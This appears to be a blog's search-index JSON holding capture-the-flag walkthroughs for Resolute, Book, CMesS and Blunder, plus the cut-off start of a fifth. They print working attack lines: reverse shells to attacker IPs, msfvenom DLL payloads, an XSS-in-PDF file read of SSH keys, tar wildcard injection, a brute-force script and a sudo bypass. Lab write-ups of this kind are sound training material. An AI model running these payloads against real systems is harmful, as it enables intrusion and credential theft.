{"categories":[{"title":"Hackthebox Writeups","uri":"https://fmash16.github.io/categories/hackthebox-writeups/"},{"title":"TryHackMe writeups","uri":"https://fmash16.github.io/categories/tryhackme-writeups/"}],"posts":[{"content":"Nmap Scan 1export ip=10.10.10.169 1nmap -sC -sV -sS -oN nmap.put $ip open ports:\n 53/tcp open domain? 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local)  We see that the server is running windows and has active directory. From the nmap scripts we fine the domain name and forest name as \u0026ldquo;megabank.local\u0026rdquo;. So we add a host to our /etc/hosts file\n1echo \u0026#34;10.10.10.169 megabank.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts We also fine that the smb server running allows guest authentication.\nEnumeration Active Directory - enum4linux We enumerate using enum4linux\n1enum4linux -a $ip In the output, we find the following users and groups\n1Group \u0026#39;Schema Admins\u0026#39; (RID: 518) has member: MEGABANK\\Administrator 2Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator 3Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest 4Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator 5Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\DefaultAccount 6Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt 7Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ryan 8Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marko 9Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sunita 10Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\abigail 11Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marcus 12Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sally 13Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\fred 14Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\angela 15Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\felicia 16Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\gustavo 17Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ulf 18Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\stevie 19Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claire 20Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\paulo 21Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\steve 22Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annette 23Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annika 24Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\per 25Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claude 26Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\melanie 27Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\zach 28Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\simon 29Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\naoki 30Group \u0026#39;Domain Admins\u0026#39; (RID: 512) has member: MEGABANK\\Administrator 31Group \u0026#39;Enterprise Admins\u0026#39; (RID: 519) has member: MEGABANK\\Administrator 32Group \u0026#39;Domain Controllers\u0026#39; (RID: 516) has member: MEGABANK\\RESOLUTE$ 33Group \u0026#39;Domain Computers\u0026#39; (RID: 515) has member: MEGABANK\\MS02$ 34Group \u0026#39;Contractors\u0026#39; (RID: 1103) has member: MEGABANK\\ryan We also find the password policy if we need to bruteforce\n1[+] Retieved partial password policy with rpcclient: 2 3Password Complexity: Disabled 4Minimum Password Length: 7 Having a thorough look at the output of enum4linux, we get\nSo a user marko has written a password in the description\n Password: Welcome123!\n Active directory - ldapsearch We see that the server is running ldap. We can retrieve the info we found with enum4linux using ldapsearch as well. First we need the rootds. to get that, we can use the nmap script ldap-search or we can use ldapsearch as well.\n1nmap --script=ldap-search -Pn -p 389 10.10.10.169 2ldapsearch -x -h 10.10.10.169 -s base namingcontexts # Cleaner results NOTE: -x for simple authentication -h for host -s for scope\nWe get the root dn:\n DC=megabank,DC=local\n 1ldapsearch -x -b \u0026#34;dc=megabank, dc=local\u0026#34; -h 10.10.10.169 # all scopes 2ldapsearch -x -b \u0026#34;dc=megabank, dc=local\u0026#34; -h 10.10.10.169 -s base # base scope 3ldapsearch -x -b \u0026#34;dc=megabank, dc=local\u0026#34; -h 10.10.10.169 -s sub # scope subtree 4 5ldapsearch -x -b \u0026#34;cn=users, dc=megabank, dc=local\u0026#34; -h 10.10.10.169  dn = distinguished name cn = common name dc = domain component ou = organizational unit  To get a better grasp of ldap namespaces, go here.\nLooking through the output, we can find the description of the user marko to get the password.\nActive directory - rpcclient We can get the users and userinfo using rpcclient NULL authentication\n1rpcclient -U \u0026#39;\u0026#39; -I 10.10.10.169 megabank.local We can execute the following rpcclient commands\n1rpcclient $\u0026gt; enumdomusers # Get a list of users with their rid 1rpcclient $\u0026gt; queryuser 0x457 # get userinfo with rid. user marko here We get the password.\nWe can look at all the users\u0026rsquo; basic info using\n1rpclient $\u0026gt; querydispinfo Privilege Escalation - User Melanie Login using found creds We try logging into the smb server using the found creds but get an authentication error\n1smbmap -u \u0026#34;marko\u0026#34; -p \u0026#34;Welcome123!\u0026#34; -H megabank.local Hydra user bruteforce It seems that the password found is not for the user \u0026ldquo;marko\u0026rdquo;. We found many other users. We try bruteforcing the found passwords against the users. For this we create a file \u0026ldquo;user.txt\u0026rdquo; that contains the names of our users. Then we bruteforce the users using hydra\n1hydra -L usernames.txt -P passwords.txt 192.168.2.66 smb -V -f We get a hit\nSo the password is for the user melanie\nCreds:\n User: melanie\nPassword: Welcome123!\n Getting a shell with evil-winrm Using our found creds, we try getting a winrm shell using evil-winrm\n1evil-winrm -i megabank.local -u melanie -p Welcome123! And we get a shell as the user melanie\nWe find our user.txt file under the \\Desktop. So this is our required user.\nPrivilege Escaltion - User ryan In the C: drive we find an interesting folder PSTranscripts/. Going in, we find a file \u0026ldquo;PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt\u0026rdquo; inside another folder. We have a look at the contents of the file.\ntype PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt We find the backup of the password for the user ryan\nCreds:\n User: ryan\nPassword: Serv3r4Admin4cc123!\n We try logging in with evilwinrm\nIn the \\Desktop directory, we fine a note.txt that says\n1Email to team: 2 3- due to change freeze, any system changes (apart from those to the 4 administrator account) will be automatically reverted within 1 minute Privilege escalation - Administrator DLL injection in DNS service Issuing the command whoami, we find that our user ryan is a memeber of the group dnsadmins\n1whoami /all Members of the group dnsadmins can be used for privilege escalation to admin with dll injection. This trick is described here.\nWe can generate our payload dll with msfvenom.\n1msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.55 LPORT=8888 -f dll -o dns.dll 2smbserver.py SHARE ./ On target, we can change the config of the dns since the user ryan belongs to the group dnsadmins. We can also start and stop the dns service.\n1dnscmd RESOLUTE /config /serverlevelplugindll \\\\10.10.14.55\\SHARE\\dnsprivesc.dll 2sc.exe stop dns 3sc.exe start dns We open up a nc listener at port 8888\n1nc -lnvp 8888 Trying a couple of times, failed to get back a reverse shell. Not sure why it did not work. A workaround would be elevating the privileges of a user that we know the password of generating an exex payload using msfvenom. We can try adding the user melanie to the admins group using the dll payload. Then the user melanie would give us administrative privileges on the machine. We generate the payload and do the previous steps again on target.\n1msfvenom -p windows/x64/exec cmd=\u0026#39;net group \u0026#34;domain admins\u0026#34; melanie /add /domain\u0026#39; --platform windows -f dll \u0026gt; dns.dll 2smbserver.py SHARE ./ Next we login to user melanie using evilwinrm and look at our user info using\n1whoami /all We see that we are now a member of the administrator group and can execute administrator commands. So we can get our required root.txt at C:\\Users\\Administrator\\Desktop\\root.txt\n","id":0,"section":"writeups","summary":"Nmap Scan 1export ip=10.10.10.169 1nmap -sC -sV -sS -oN nmap.put $ip open ports:\n 53/tcp open domain? 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 05:32:58Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.","tags":["ldap","ldapsearch","rpcclient","dll","injection","dnsadmins","dns","evil-winrm","hydra"],"title":"Hackthebox - Resolute Writeup","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-resolute-writeup/","year":"2020"},{"content":"Nmap Scan 1nmap -sC -sV -sS -oN nmap.out book.htb Open ports:\n 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  Enumeration Web Going to the webpage, we find a login prompt. We sign up for an accound and login.\nThere is a section called \u0026ldquo;Collections\u0026rdquo; where we can submit a book. Seems like we can upload a file to the server. We try uploading a php-web-shell and succeed. But we dont know the location where the submission is stored yet.\nFrom the \u0026ldquo;Contact us\u0026rdquo; option, we find the admin email account:\n admin@book.htb\n Gobuster fuzzing 1gobuster dir -u http://book.htb/ -w /usr/share/wordlists/dirb/common.txt We find a folder /doc, which might contain our uploaded file. But we cannot access it yet. We also see a /admin page.\n/doc Going to the home page of the site after logging in, we find some pdf files describing flowers. These can be downloaded and are named in the format 1.pdf. From a hunch, we try the url http://book.htb/1.pdf and we do in fact get the same pdf file. So the pdf files are stored in the /doc folder.\nSo /doc should be where our submissions go. But trying to open our submission going to the url http://book.htb/docs/php-reverse-shell.php shows a 404. So either our file was not uploaded or its name was changed.\n/admin login Going over to /admin page, we find a login prompt similar to the previous one found, but this one shows for authorized people only.\nWe try logging in with our created account but fail.(duh!)\nadmin account - SQL truncation attack Looking at the source of the signup page, we find something interesting\n1function validateForm() { 2 var x = document.forms[\u0026#34;myForm\u0026#34;][\u0026#34;name\u0026#34;].value; 3 var y = document.forms[\u0026#34;myForm\u0026#34;][\u0026#34;email\u0026#34;].value; 4 if (x == \u0026#34;\u0026#34;) { 5 alert(\u0026#34;Please fill name field. Should not be more than 10 characters\u0026#34;); 6 return false; 7 } 8 if (y == \u0026#34;\u0026#34;) { 9 alert(\u0026#34;Please fill email field. Should not be more than 20 characters\u0026#34;); 10 return false; 11 } So this script shows that our inputs in the fields should be limited by the set number of characters. What if we give a longer input? It will get truncated. This is known as SQL Truncation Attack\nSo if we create an account with a name like \u0026quot;admin hello\u0026quot;, the script will truncate all characters after the 10th. And so our name becomes admin, and we could run admin on the site. The form must allow spaces in the name for this. We check for that and find that we can in fact input spaces.\nNow, we try creating our admin account. The signup page seems to perform a client side email validation. To bypass that, we craft our request using burp. We intercept a signup request and edit that as per our needs. Our crafted http request stands\n1POST /index.php HTTP/1.1 2Host: book.htb 3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 5Accept-Language: en-US,en;q=0.5 6Accept-Encoding: gzip, deflate 7Referer: http://book.htb/index.php 8Content-Type: application/x-www-form-urlencoded 9Connection: close 10Upgrade-Insecure-Requests: 1 11Content-Length: 61 12 13name=admin+++++a\u0026amp;email=admin%40book.htb++++++a\u0026amp;password=hello We have URL encoded the params after adding necessary number of spaces. Now we send the POST request and try logging in with the admin account with our set password. And we succeed.\nFile upload Now, logged in as admin, we can view the collections files stored in a pdf file with links to the files. Submitting our php-web-shell, we do not see\nthat in our collections, so it was not uploaded. We are only allowed to upload pdf files. We upload a random pdf file and download the collections pdf. We see that our included pdf is listed with a number. So our upload gets renamed by a number.\nAnother thing we notice is that the pdf is dynamically generated each time we request for a download. This dynamic generation of the pdf file can be exploited using XSS since we control the input filename. It took me quite a long time to fine this. This can be used to read local files. This has been explained here.\nSo in order to exploit the XSS, we input the following script as the \u0026ldquo;Book Title\u0026rdquo; and enter any random pdf file\n1\u0026lt;script\u0026gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\u0026#34;GET\u0026#34;,\u0026#34;file:///etc/passwd\u0026#34;);x.send();\u0026lt;/script\u0026gt; Then we download the collections pdf from the admin page and see the /etc/passwd file 79101.pdf We find a user named reader\nPrivilege Escalation - User Getting id_rsa of user Since we can read any local files, lets try reading the id_rsa of the found user \u0026ldquo;reader\u0026rdquo; at /home/reader/.ssh/id_rsa.\n1\u0026lt;script\u0026gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(\u0026#34;GET\u0026#34;,\u0026#34;file:///home/reader/.ssh/id_rsa\u0026#34;);x.send();\u0026lt;/script\u0026gt; And we get the private key. We can use this for ssh login to the user account.\npdf2txt conversion The key if copied from the pdf to a file, is not in the correcto id_rsa format. To convert the pdf to txt, we use a python tool called pdfminer.six\nWe install it using\n1sudo apt install python3-pdfminer 2pip install pdfminer.six Then, we convert the pdf to txt and do some editing in spaces to get the correct format id_rsa.\n1python3 /usr/local/bin/pdf2txt.py 64757.pdf\u0026gt;id_rsa SSH login with id_rsa We change the permissions of the id_rsa\n1chmod 600 id_rsa And then we login to the machine as user reader\n1bash -i id_rsa reader@book.htb And we get the shell of the user. And we can read the user.txt\nPrivilege Escalation - root Enumeration linpeas.sh gives us some interesting info about system timers\nWe find a timer named book.timer that seems to run at an interval of 1m.\nTo see what the timer executes, we run pspy64 to monitor the processes. And get what commands the timer runs.\n1/usr/sbin/logrotate -f /root/log.cfg 2/bin/sh /root/log.sh 3sleep 5 The timer seems to run logrotate\nlogrotate race condition exploit “Log rotation” refers to the practice of archiving an application’s current log, starting a fresh log, and deleting older logs. Googling around we find that logrotate is vulnerable to a race condition.\nThis working of this exploit is described fully at feedyourhead. A PoC can be found on github by whotwanger. We can use this PoC for our case.\nAs per the instructions, we execute the follwing :\n We download the c file to our target and compile it. Next we create our payload containing our reverse shell. We need to background the shell, otherwise we will not get a stable shell. Next we run the compiled source with required args.  1wget http://10.10.15.237:8000/logrotten.c 2gcc -o logrotten logrotten.c 3echo \u0026#34;python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.15.237\u0026#34;,1234));os.dup2(s.fileno(),0); 4os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; \u0026amp; 5./logrotten -d -p ./payloadfile /home/reader/backups/access.log Next we need to write some random contents to the access.log file in backups.  1echo hello \u0026gt; access.log We fire up a nc listener on our host  1nc -lnvp 1234 And we get a root shell. We can now read our root.txt file.\nPS: The root shell will only be active for a short time. So the commands need to be executed fast. After a short time, the shell exists but the tty cannot be accessed anymore and you will get an error:\n1/bin/sh: 3: Cannot set tty process group (Inappropriate ioctl for device) 2/bin/sh: 3: Cannot set tty process group (Inappropriate ioctl for device) The reason this happens, according to my guess, is that when our payload gets executed as root, the shell opens as interactive tty. But a while later, the child process id disconnected from the tty. So we see a zombie shell.\nResources  https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html https://support.rackspace.com/how-to/understanding-logrotate-utility/ https://github.com/whotwagner/logrotten https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition https://tech.feedyourhead.at/content/abusing-a-race-condition-in-logrotate-to-elevate-privileges  ","id":1,"section":"writeups","summary":"Nmap Scan 1nmap -sC -sV -sS -oN nmap.out book.htb Open ports:\n 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  Enumeration Web Going to the webpage, we find a login prompt. We sign up for an accound and login.\nThere is a section called \u0026ldquo;Collections\u0026rdquo; where we can submit a book. Seems like we can upload a file to the server.","tags":["sql truncation attack","lfi","xss","dynamic js","dynamic xss","logrotate race condition","sql","linux","real world"],"title":"Hackthebox - Book Writeup","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/","year":"2020"},{"content":"Nmap Scan 1nmap -sC -sV -sS -oN nmap.out cmess.thm Open ports:\n 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) ssh-hostkey: 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) http-generator: Gila CMS http-robots.txt: 3 disallowed entries /src/ /themes/ /lib/ http-title: Site doesn\u0026rsquo;t have a title (text/html; charset=UTF-8).  Enumeration Going to port 80, we find the Gila CMS home page\nGobuster fuzzing 1gobuster dir -u http://cmess.thm/ -w /usr/share/wordlists/dirb/common.txt We got a lot of directories here. We get an admin login page for the Gila CMS.\nFuzzing for subdomains Domains might containg subdomains hosting different contents. We can fuzz for the subdomains for example: XYZ.cmess.thm using wfuzz by bruting the host header. If a subdomain exists, we will get a page with different word counts than the domain most likely as its contents are different. So, we execute the following first to get the word count of the page we already got for domain \u0026ldquo;cmess.thm\u0026rdquo;\n1wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H \u0026#34;Host: FUZZ.cmess.thm\u0026#34; We get lot of success outputs and with the wordcount 290. So this is the word count of the home page we got. Any existing subdomain should contain different number of words. So we can specify it using --hw 290 which \u0026ldquo;Hide responses with the specified words\u0026rdquo;.\n1wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cmess.thm -H \u0026#34;Host: FUZZ.cmess.thm\u0026#34; --hw 290 And we get a subdomain dev.cmess.htb. We add it to our /etc/hosts file to the same IP address as of cmess.htb.\nSubdomain Contents: Browsing http://dev.cmess.thm, we find the following\nIt seems to be a chat between user andre and the support. And we get the email and password for the user andre which can be used for login in the cms\nCreds found:\n Email: andre@cmess.thm\nPassword: KPFTN_f2yxe%\n Gila Admin Login We login to the the cms using our found creds\nLooking around, we see that we have the ability to upload files to the machine at Content -\u0026gt; File Manager option. We can upload a php-web-shell and get command execution on the box. We transfer our php-web-shell.php to the machine.\nNow we can go to the url http://cmess.thm/assets/php-reverse-shell.php and execute commands.\nwww-data shell We try getting a reverse shell using php\n1php -r \u0026#39;$sock=fsockopen(\u0026#34;10.9.17.253\u0026#34;,1234);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; On host\n1nc -lnvp 1234 And we get a shell back as user www-data. We stabilize the shell.\nPrivilege Escalation - User gila config.php We find the file config.php under /var/www/html. The file has something interesting.\nWe find the db creds for root.\nDB creds found:\n user : root\npass : r0otus3rpassw0rd\n MySQL database dump We can dump the entire mysql database using the root creds we found using\n1mysqldump -uroot -pr0otus3rpassw0rd --all-databases \u0026gt; all_databases.sql Having a throrogh look at the dump file, we find a hash for the user \u0026ldquo;andre\u0026rdquo;\n User: andre\nPassword: $2y$10$uNAA0MEze02jd.qU9tnYLu43bNo9nujltElcWEAcifNeZdk4bEsBa\n Looking at hashcat example hashes, we find that this hash is blowfish hash. We try cracking the hash using hashcat.\nUser andre backup Looking around, we find an interesting file .password.bak under /opt. The file contains\n1andres backup password 2UQfsdCB7aAP6 SSH login Using the found backup password, we login using ssh to get the user.txt.\nPrivilege Escalation - root Enumeration Copying linpeas.sh over to the target, we run it. Linpeas shows us some interesting cron jobs\nlinpeas marks it as 99% PE vector. We see that the cron job backups everyting under the folder /home/andre/backup to the /tmp folder as a tar. For tar ing the files, it uses wildcard. Googling for a bit, we find that this wildcard can be exploited.\nCrontab tar exploit This exploit has been very well explained in hackingarticles.in\nThe tar privesc is also found in gtfobins though it needs to be changed for our use.\nFollowing the exploit, we write a script shell.sh that gives us a reverse shell\n1#!/bin/bash 2 3bash -i \u0026gt;\u0026amp; /dev/tcp/10.9.17.253/1337 0\u0026gt;\u0026amp;1 Then we execute the following\n1echo \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash shell.sh\u0026#34; 2echo \u0026#34;\u0026#34; \u0026gt; --checkpoint=1 On the host, we open a nc listener and wait\n1nc -lnvp 1337 And after a bit, we get our root shell and can read the root.txt under /root\n","id":2,"section":"writeups","summary":"Nmap Scan 1nmap -sC -sV -sS -oN nmap.out cmess.thm Open ports:\n 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) ssh-hostkey: 2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA) 256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA) 256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) http-generator: Gila CMS http-robots.txt: 3 disallowed entries /src/ /themes/ /lib/ http-title: Site doesn\u0026rsquo;t have a title (text/html; charset=UTF-8).  Enumeration Going to port 80, we find the Gila CMS home page","tags":["Gila CMS","subdomain","wfuzz","php","wildcard","tar","crontab","linux","mysqldump","fuzzing"],"title":"TryHackMe - CMesS Writeup","uri":"https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/","year":"2020"},{"content":"Nmap Scan Open ports:\n Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 00:27 EDT\nNmap scan report for 10.10.10.191\nHost is up (0.49s latency).\nNot shown: 998 filtered ports\nPORT STATE SERVICE VERSION\n21/tcp closed ftp\n80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\nhttp-generator: Blunder\nhttp-server-header: Apache/2.4.41 (Ubuntu)\nhttp-title: Blunder | A blunder of interesting facts\n Enumeration ffuf fuzzing 1ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ We get a /admin that has the login for the \u0026ldquo;Bludit cms\u0026rdquo; We also get a /LICENSE. The file shows\nFuzzing for file with .txt extensions, we get something interesting\n1ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -x 2.txt We get a possible username fergus\n User: fergus\n Gowing to the URL: http://10.10.10.191/todo.txt, we get:\nGot a possible user:\n User: Diego Najar\n Exploit Bruteforce Got a brute force vulnerability here\nGenerate a custom wordlist using cewl\n1cewl -w passwords.txt -d 9 -m 10 blunder.htb We need to modify the found exploit script as per our needs. The modified script is:\n1#!/usr/bin/env python3 2import re 3import requests 4 5host = \u0026#39;http://10.10.10.191\u0026#39; 6login_url = host + \u0026#39;/admin/login\u0026#39; 7username = \u0026#39;fergus\u0026#39; 8wordlist = [] 9 10# Generate 50 incorrect passwords 11with open(\u0026#34;passwords.txt\u0026#34;, \u0026#34;r\u0026#34;) as f: 12 for line in f.readlines(): 13 wordlist.append(str(line).strip(\u0026#34;\\n\u0026#34;)) 14 15# Add the correct password to the end of the list 16# wordlist.append(\u0026#39;adminadmin\u0026#39;) 17 18for password in wordlist: 19 session = requests.Session() 20 login_page = session.get(login_url) 21 csrf_token = re.search(\u0026#39;input.+?name=\u0026#34;tokenCSRF\u0026#34;.+?value=\u0026#34;(.+?)\u0026#34;\u0026#39;, 22login_page.text).group(1) 23 24 print(\u0026#39;[*] Trying: {p}\u0026#39;.format(p = password)) 25 26 headers = { 27 \u0026#39;X-Forwarded-For\u0026#39;: password, 28 \u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 29(KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36\u0026#39;, 30 \u0026#39;Referer\u0026#39;: login_url 31 } 32 33 data = { 34 \u0026#39;tokenCSRF\u0026#39;: csrf_token, 35 \u0026#39;username\u0026#39;: username, 36 \u0026#39;password\u0026#39;: password, 37 \u0026#39;save\u0026#39;: \u0026#39;\u0026#39; 38 } 39 40 login_result = session.post(login_url, headers = headers, data = data, 41allow_redirects = False) 42 43 if \u0026#39;location\u0026#39; in login_result.headers: 44 if \u0026#39;/admin/dashboard\u0026#39; in login_result.headers[\u0026#39;location\u0026#39;]: 45 print() 46 print(\u0026#39;SUCCESS: Password found!\u0026#39;) 47 print(\u0026#39;Use {u}:{p} to login.\u0026#39;.format(u = username, p = password)) 48 print() 49 break PS: The user we need to brute the password for is fergus, not admin. Trying with admin, we failed and trying with fergus, we succeed.\nWe run the script and get our required password.\nCreds:\n User: fergus\nPassword: RolandDeschain\n Bludit - Directory Traversal Image File Upload (Metasploit) Searching for bludit exploits , we find one in exploitdb\nWe see that it\u0026rsquo;s a metasploit script. So we fire up metasploit and use the script. We set our rhosts, user and pass as retrieved previously and run the exploit. We get a meterpreter shell back successfully.\nwww-data shell We try getting a proper reverse shell from the merterpreter shell\n1php -r \u0026#39;$sock=fsockopen(\u0026#34;10.10.14.55\u0026#34;,8888);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; We get a reverse shell back. We stabilize our shell using python.\n1python3.7 -c \u0026#34;import pty;pty.spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; 2stty raw -echo 3fg Privilege Escalation - User Enumeration Looking around, we find a file \u0026ldquo;users.php\u0026rdquo; under the database directory in bludit bl-contents. The file contains the following\nWe get 2 users admin and hugo which we used for login. we retrieve the password hash and salt for the admin from here\n \u0026ldquo;role\u0026rdquo;: \u0026ldquo;admin\u0026rdquo;,\n\u0026ldquo;password\u0026rdquo;: \u0026ldquo;bfcc887f62e36ea019e3295aafb8a3885966e265\u0026rdquo;,\n\u0026ldquo;salt\u0026rdquo;: \u0026ldquo;5dde2887e7aca\u0026rdquo;,\n Going back, we find another version of bludit site under the /var/www directory. In that version, we take a look at the users.php file in the same location as before and find the following\nUser password hash crack We get a user hugo here and the password hash. Analyzing the hash in cyberchef, we see that it is an SHA1 hash. We crack the hash using crackstation and obtain the password for the user\nCreds found:\n User: hugo\nhash: faca404fd5c0a31cf1897b823c695c85cffeb98d\nPassword: Password120\n Going over to the /home directory, we see that hugo is in fact a user. We also find another user shaun.\nUser shell We switch to user hugo using su and the password obtained and get the user shell.\n1su - hugo Now we can read our required user.txt file\nPrivilege Esccalation - Root Looking for sudo permissions for our user using sudo -l, we find that the user hugo can exevute /bin/bash as all users except root (ALL:!root)\nWe see that we can execute /bin/bash as any user other than root. This can be exploited using a popular sudo vulnerability CVE-2019-14287. Following the exploit, we execute /bin/bash ash sudo and get a root shell\n1sudo -u#-1 /bin/bash Now we can read our required root.txt file from the /root directory.\n","id":3,"section":"writeups","summary":"Nmap Scan Open ports:\n Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-31 00:27 EDT\nNmap scan report for 10.10.10.191\nHost is up (0.49s latency).\nNot shown: 998 filtered ports\nPORT STATE SERVICE VERSION\n21/tcp closed ftp\n80/tcp open http Apache httpd 2.4.41 ((Ubuntu))\nhttp-generator: Blunder\nhttp-server-header: Apache/2.4.41 (Ubuntu)\nhttp-title: Blunder | A blunder of interesting facts\n Enumeration ffuf fuzzing 1ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ We get a /admin that has the login for the \u0026ldquo;Bludit cms\u0026rdquo; We also get a /LICENSE.","tags":["bludit cms","fuzzing","cewl","sudo privesc"],"title":"Hackthebox - Blunder Writeup","uri":"https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-blunder-writeup/","year":"2020"},{"content":"Nmap Scan  1nmap -sC -sV -sS -oN nmap.out 10.10.10.172 Open ports:\n PORT STATE SERVICE VERSION\n53/tcp open domain?\n88/tcp open kerberos-sec Microsoft Windows Kerberos (server time:\n2020-05-24 10:34:50Z)\n135/tcp open msrpc Microsoft Windows RPC\n139/tcp open netbios-ssn Microsoft Windows netbios-ssn\n389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:\nMEGABANK.LOCAL0., Site: Default-First-Site-Name)\n445/tcp open microsoft-ds?\n464/tcp open kpasswd5?\n593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0\n636/tcp open tcpwrapped\n3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain:\nMEGABANK.LOCAL0., Site: Default-First-Site-Name)\n3269/tcp open tcpwrapped\n1 service unrecognized despite returning data. If you know the service/version,\nplease submit the following fingerprint at\nhttps://nmap.org/cgi-bin/submit.cgi?new-service 